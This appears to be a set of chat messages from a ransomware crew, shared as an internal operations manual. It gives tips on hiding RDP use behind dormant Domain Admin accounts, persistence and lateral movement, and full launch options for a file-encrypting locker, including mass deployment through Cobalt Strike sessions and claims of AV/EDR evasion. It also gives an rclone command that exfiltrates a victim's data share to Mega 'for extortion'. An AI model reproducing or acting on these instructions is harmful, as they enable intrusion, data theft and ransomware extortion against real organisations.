Message: Guys, there is a tip for everyone who works with networks::
When you have a network with rights - if possible, make yourself several sessions on other machines (preferably server ones, they work 24x7). If your entrypoint machine reboots on which the session is, you can independently return to the network without wasting time as a team lead and you don’t have to sit and wait until the session is raised for you.
=)

Message: ------------------- IF RDP IN LOCAL IS VERY NEEDED :: HOW NOT TO SLEEP ::
1. Select the server OS, ping, found. Making a listing of dira
``ls \\REMOTE-HOSTNAME\C$\Users``
Sort by Modified. Where there is a fresh touch - it is DEFINITELY IMPOSSIBLE to go under these users, because the following situation will easily arise - you go in, download balls / test something and suddenly this user comes to this PC and sees your work results ... Detect. Cleaning. End of the game.
To do this, select the user who went to this server last year, say.
Do you think the mechanics are clear?
2. Selecting a user from YES that hangs in YES but is almost never used
```shell net group "Domain Admins" /domain```
This is a list of our YES
Next, on the user, we take turns removing the information
``shell net user Administrator /domain``
We are looking for the Last Logon line - that is, when you logged in to the network for the last time (on any of the PCs in the grid)
If there is a date like the month before last, half a year or finally a year - excellent. This is what we need. Most likely, this is either a service account or an admin to which they do not go, and it definitely will not interfere with your RDP.

Such simple tricks will help you not to sleep stupidly on the RDP

3. We do not sit on the RDP, after we have finished - we do Logoff (MANDATORY). Not to be confused with simply closing the RDP window.

Message: Salute guys. Such is the question. Share who uses what script if the session is from the network with a user who has slightly more privileges than the "printer". I’ll make a reservation right away that the standard methods have been tried, there are no tokens, the seatbelt, it doesn’t work like any other “execute-assembly” commands (Failed to load the assembly w / hr 0x8007000b) the ball will not move where this user will go either. Access to system folders is closed. In the process from the system, the injection cannot do it either. In general, what do you do in such cases. The question is of a general nature, such are the "hard cases"

	1. smb_login with credits on the DC / net use on the DC / login to Outlook or webmail (if domain authorization is attached) / ldap_login (https://github.com/lanjelot/patator) for example by a patator
	2. The first part is a rudimentary LM hash, you can safely forget about what it is with us, it was and will always be the same, the second is NTLM hash, in fact, the one that we often use for authorization
	3. It will be later, you can set tasks through the admin panel on decrypt hashes and brute force of keypasses / docks / excels
	4. https://github.com/0xthirteen/StayKit - all pinning techniques are described here and divided into categories and by privilege level, there is nothing more detailed here, there have been no "unique" techniques for Windows systems for years. There are alternative things like web shells on a web server (this is aspx code that is hosted on a web server, in this case IIS where a functional application "lives" - most often and most conveniently uploaded to an exchange), there is an IIS module. For now, stop at stay-kit'e because it gives understanding, in the future I will simply give you a convenient tool for fixing simply by running the dll
	5. everything that is in the network is administered by people. the key to obtaining the most detailed data about the investigated IS lies with the admins/network engineers. These are digrams and accesses and everything else. You can identify cloud or taped backups only through them or by indirect signs (services / tasks on critical servers, entries in hell, etc.)
	6. the question is incorrect. you don't "need" to do it, smb_pipe is basically just a type of load that is +- technically equal to bind payload in metasploit, used for machines with authorization restrictions or for machines that are not able to pipe out with standard http(s)/dns/tcp protocol, that is, jump psexec (_psh) 10.0.0.1 pipe is the creation of a service for the bind pipe, through which the initiating machine will then connect
	7. I will issue a builder dll files
	8. You now have like three, do you need more? if yes - tell me which servers and how many do you need
	9. And what hangs? I do not know.

Message: ```Launch options:

all - Encrypt all (Default)
net - only encrypt network resources
local - only encrypt local files

usage example:
lock.exe -m all or lock.exe
lock.exe -m local
lock.exe -m net

run example:
lock.exe -h C:\hosts.txt

-nomutex
Disables mutex protection against double triggering.

-size[10/15/20/25/30/35/40/45/50/60/70/80]
This parameter determines how much % of the file will be encrypted (50% by default), the file is encrypted in different places in chunks.
In this case, databases are encrypted by 100%, vm files by 20%, regardless of the parameter value.

example:
lock.exe -size 35

-p[path]
When using this parameter, the locker will encrypt files at the specified path
It is forbidden to start the locker in normal mode until the process of processing the specified path is completed.

example:
lock.exe -nomutex -p C:\path
lock.exe -nomutex -p C:\path2
lock.exe -nomutex -p \\host\path

-log [path to log file]
Enables error logging
Usage example:
lock.exe -log C:\log.txt

All parameters can be combined with each other, the order is not important. If the locker is launched through the command line, then run it as an administrator (If you have rights).

ATTENTION: Everything described in this channel is not subject to distribution, copying or publication on any third-party resources.

Things worth remembering and knowing.
1. A separate build is always generated for each grid, which you need to request by calling @alter in the conf.
2. In the standard package, the build is issued as an archive that contains an .exe file and two .dll files with different bitness for fileless launch through cobalt sessions.
3. At the moment, fileless launch bypasses the vast majority of known AV/EDR systems, and no speed loss has been noticed.

Launch parameters:

-m[all/net/local]
all - Encrypt all (Default)
net - only encrypt network resources
local - only encrypt local files

usage example:
lock.exe -m all or lock.exe
lock.exe -m local
lock.exe -m net

run example:
lock.exe -h C:\hosts.txt

-nomutex
Disables mutex protection against double triggering.

-size[10/15/20/25/30/35/40/45/50/60/70/80]
This parameter determines how much % of the file will be encrypted (50% by default), the file is encrypted in different places in chunks.
In this case, databases are encrypted by 100%, vm files by 20%, regardless of the parameter value.

example:
lock.exe -size 35

-p[path]
When using this parameter, the locker will encrypt files at the specified path
It is forbidden to start the locker in normal mode until the process of processing the specified path is completed.

example:
lock.exe -nomutex -p C:\path
lock.exe -nomutex -p C:\path2
lock.exe -nomutex -p \\host\path

-log [path to log file]
Enables error logging
Usage example:
lock.exe -log C:\log.txt

All parameters can be combined with each other, the order is not important.

Running as a dll via cobaltstrike

Put the files inject.cna massinjector.cna inject_x86.o and inject_x64.o in one folder.
Load file inject.cna cobaltstrike -> script manager -> load

An example of launching within a single machine where there is a session:
mandllinject c:\path\locker.dll

Arguments are passed in quotes
mandllinject c:\path\locker.dll "arguments here"

An example of running at once on X machines where there is a session:
We select the necessary sessions in a "pack", press RMB and select dllinject from the menu
In the dialog box that appears, specify the paths to the dlllocker of the necessary bitness and arguments (if any) and confirm.

NOTE:
It is forbidden to start the locker in normal mode until the process of processing the specified path is completed.
NOTE
this is due to the inclusion of noumutex !!!

- What does it mean?
This means that either you can run the locker with the -nomutex flag any number of times with a path, but there should not be a running locker process WITHOUT a path specified until the "specified" paths are fully processed.

there will be a section below
Install Oracle Java 15 on Ubuntu, Debian, Linux Mint, Pop!_OS, Zorin OS and others using an APT PPA repository

Included in a folder
	Cobalt42_v2/Toolkits/artifact/brooks-artifact-kit/
there is an artifact.cna that needs to be imported into cobalt to generate internal native loads and staged loads to run.

At the moment, the situation with detections is as follows:
https://dyncheck.com/scan/id/eeab696158db737d90da83a0ebf7bc53 - x64 dll
https://dyncheck.com/scan/id/f656a34930eb682d6cab252798234f7c - service-exe-x64
https://dyncheck.com/scan/id/32c29f3ba498be4915bb72d4bae824ce - staged payload x64

All these loads are used not only for manually launching files, but also for jump functionality.
Enjoy, give feedback, wait for updates and patch notes.
Thanks to all.

Artifact Whale is used in the following cases:
	* Attacks -> Packages -> Windows Executable
	* Attacks -> Packages -> Windows Executable (S)
	* Attacks -> Web Drive-by -> Scripted Web Delivery (bitsadmin and exe)
	* Beacon's 'elevate svc-exe' command
	* Beacon's 'jump psexec' and 'jump psexec64' commands

Message: ``` guys, I'm telling you how to use rklon:
1. download the program itself (laid out in general), create a file rclone.conf and put it in the same folder with exe
2. then open cmd from the admin, fall into the folder where the program with the configuration file lies and execute the command: rclone config
3. then a menu pops up in which we create a config (roughly speaking, we roll in mega credits), after the credits are rolled in, the program writes them to the rclone.conf file, in encrypted form.
4. we take the received rclone.conf file and the program itself and put it on the host from which we are going to pull the information, of course it’s better to put it in a secluded place
5. we fall into the folder where we put the config and the program and execute the command:

shell rclone.exe copy "\\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12

well, here I think it’s clear that what’s in quotes is what we’re extorting, we can specify it as you like, even the entire disk
remote - the name of the config, which we specified when performing step 3, data - the folder in the mega where the info is uploaded

Message: and another moment, because I heard from viola that someone did not start the session gopher ps script, this also applies to other ps1 scripts, and to those situations when a server without powershell ISE
Example: there is a script
```
examplescript.ps1
```
and in the manual on the github, the launch is indicated as:
```
. .\examplescript.ps1
```
and then the command
```
Invoke-ExampleScript -argument
```
you run it and it gives you an error that there is no cmdlet, this is because the cmdlets do not pull up like that (it didn’t work for me in any case)
this is solved in the following way, change the file extension from .ps1 to .psm1 - we get the powershell plug-in
open regular powershell
write
```
Import-Module .\examplescript.psm1
```
call the function with the next command

ran it through the ps1 program, she recoded it from 7627 to 250 characters, added the resulting code to

If megasync lags, does not allow you to download the archive or the speed is very low, then you can upload the archive through the same rclone

rclone.exe move remote:archive E:\ -P --multi-thread-streams 12 --transfers 12

where remote is the name of the config, archive is the name of the folder, E:\ is the folder where the archive will be dumped, -P shows download progress, to not see any progress changes to -q, --multi-thread-streams and transfers for high download

helped a lot to cope with anomalies in the form of 200kb / s and when the archive is downloaded 500 times and as a result is not saved to disk

Rosetka suggested a working trick with changing the date in Cmd
If your cob swears that the license has expired, do the following:
In Cmd, change the date with the command data 07/01/2020
Then we run the koba and change the date back,
since OpenVpn can start swearing at an expired certificate

Remarks:

- Add a new inbound or outbound rule to the firewall policy.
- Rule name should be unique and cannot be "all".
- If a remote computer or user group is specified, security must be
authenticate, authenc, authdynenc, or authnoencap.
- Setting security to authdynenc allows systems to dynamically
negotiate the use of encryption for traffic that matches
a given Windows Firewall rule. Encryption is negotiated based on
existing connection security rule properties. This option
enables the ability of a machine to accept the first TCP
or UDP packet of an inbound IPsec connection as long as
it is secured, but not encrypted, using IPsec.
Once the first packet is processed, the server will
re-negotiate the connection and upgrade it so that
all subsequent communications are fully encrypted.
- If action=bypass, the remote computer group must be specified when dir=i
n.
- If service=any, the rule applies only to services.
- ICMP type or code can be "any".
- Edge can only be specified for inbound rules.
- AuthEnc and authnoencap cannot be used together.
- Authdynenc is valid only when dir=in.
- When authnoencap is set, the security=authenticate option becomes an
optional parameter.

Examples:

Add an inbound rule with no encapsulation security for browser.exe:
netsh advfirewall firewall add rule name="allow browser"
dir=inprogram="c:\programfiles\browser\browser.exe"
security=authnoencap action=allow

Add an outbound rule for port 80:
netsh advfirewall firewall add rule name="allow80"
protocol=TCP dir=out localport=80 action=block

Add an inbound rule requiring security and encryption
for TCP port 80 traffic:
netsh advfirewall firewall add rule
name="Require Encryption for Inbound TCP/80"
protocol=TCP dir=in localport=80 security=authdynenc
action=allow

Add an inbound rule for browser.exe and require security
netsh advfirewall firewall add rule name="allow browser"
dir=inprogram="c:\program files\browser\browser.exe"
security=authenticate action=allow

Add an authenticated firewall bypass rule for group
acmedomain\scanners identified by a SDDL string:
netsh advfirewall firewall add rule name="allow scanners"
dir=in rmtcomputergrp=<SDDL string> action=bypass
security=authenticate

Add an outbound allow rule for local ports 5000-5010 for udp-
Add rule name="Allow port range" dir=out protocol=udp localport=5000-5010
action=allow

This is a kms server and its sources. Inside the installation script, it just contains commands manually to the console (only 3 commands, xs why the script does not work out). Install kms server on any machine in the network.
Further from other machines we register its ip, usually like this
```
slmgr /ipk FJ82H-XT6CR-J8D7P-XQJJ2-GPDD4
slmgr /skms <IP>:1688
slmgr /ato
```
Key - kms key for the system, kms keys on the ms website in the public domain.
Volume edition is usually activated, Evaluation is not activated.
This kms can activate both windows and office.
The office is usually activated like this:
```
cd c:\Program Files\Microsoft Office\Office15
cscript ospp.vbs /inpkey:<cms-office key here>
cscript ospp.vbs /sethst:192.168.1.10
cscript ospp.vbs /act
